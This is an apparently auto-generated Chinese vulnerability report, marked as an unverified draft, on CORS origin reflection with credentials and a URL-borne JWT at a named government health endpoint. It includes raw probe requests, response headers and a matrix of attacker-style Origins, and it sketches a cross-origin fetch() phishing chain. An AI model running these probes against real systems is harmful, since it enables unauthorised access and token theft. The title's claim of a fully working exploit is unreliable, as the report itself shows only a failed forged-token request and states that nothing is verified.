# POC/EXP — 4004 /health 端点 CORS 任意 Origin 反射 + ACAC + URL 参数 JWT（钓鱼链 PoC 完整可行）

> 漏洞ID: `b65c0339-1285-4594-a102-1a1400bc4c65`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4004/health`

**類型**: CORS配置错误 / 跨域访问控制绕过

## 描述

Express/Node.js 认证服务器在 /health?token= 端点上配置了危险的 CORS 策略：CORS 中间件对任意非空非 null Origin 无差别反射 Access-Control-Allow-Origin（保留原始 Origin 大小写/协议/端口），同时下发 Access-Control-Allow-Credentials: true。结合 JWT 通过 URL 参数（?token=）而非标准 Authorization 头传递，构成可独立利用的跨域钓鱼链：攻击者部署任意域名页面（如 https://evil.epcr.tpf.gov.tw.attacker.com 或 https://attacker.epcr.tpf.gov.tw），通过 fetch() 跨域读取 /health?token= 响应内容——无需控制真实 EPCR 域。已实测 8 个 Origin 变体（合法主域、前缀混淆、后缀混淆、虚构子域、大小写不敏感、长前缀混淆、协议降级）全部通过 CORS 反射。仅"无 Origin 头"与"Origin: null"两种特殊情况不反射。

## 前置條件

1. 受害者访问攻击者控制的恶意页面（含 CORS 反射 PoC JS）。
2. 受害者持有 epcr.tpf.gov.tw:4004 颁发的合法 JWT（无论通过何种途径——登录/XSS/会话窃取）。
3. 浏览器启用 CORS（现代浏览器默认行为）。
无需任何服务端凭证/账号。

## POC / 復現步驟

```
GET https://epcr.tpf.gov.tw:4004/health?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.bad
Origin: https://evil.epcr.tpf.gov.tw.attacker.com

响应头:
  HTTP/1.1 401 Unauthorized
  access-control-allow-origin: https://evil.epcr.tpf.gov.tw.attacker.com
  access-control-allow-credentials: true
  vary: Origin
  content-type: text/html; charset=utf-8
  content-security-policy: default-src 'self';style-src 'self' 'unsafe-inline';frame-ancestors 'none';script-src 'self' 'unsafe-inline';img-src 'self' data:
  x-content-type-options: nosniff
  x-frame-options: SAMEORIGIN
  referrer-policy: no-referrer
  strict-transport-security: max-age=15552000; includeSubDomains
  set-cookie: connect.sid=s%3A...

响应体: <h1>jwt malformed</h1> (164 字节)

复测矩阵（8 个 Origin 全部返回 ACAO 反射）:
- https://www.epcr.tpf.gov.tw            → ACAO 反射
- https://evil.epcr.tpf.gov.tw.attacker.com → ACAO 反射
- https://epcr.tpf.gov.tw.evil.com       → ACAO 反射
- https://attacker.epcr.tpf.gov.tw       → ACAO 反射
- https://EPcr.TPF.gov.tw                → ACAO 反射（大小写不敏感）
- https://xepcr.tpf.gov.tw.attacker.com  → ACAO 反射（长前缀混淆）
- http://epcr.tpf.gov.tw:4004            → ACAO 反射（协议降级）
- 无 Origin 头                          → 不反射
- Origin: null                           → 不反射

OPTIONS /health 预检:
  HTTP/1.1 204 No Content
  access-control-allow-origin: https://evil.example.com
  access-control-allow-credentials: true
  access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
  vary: Origin
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
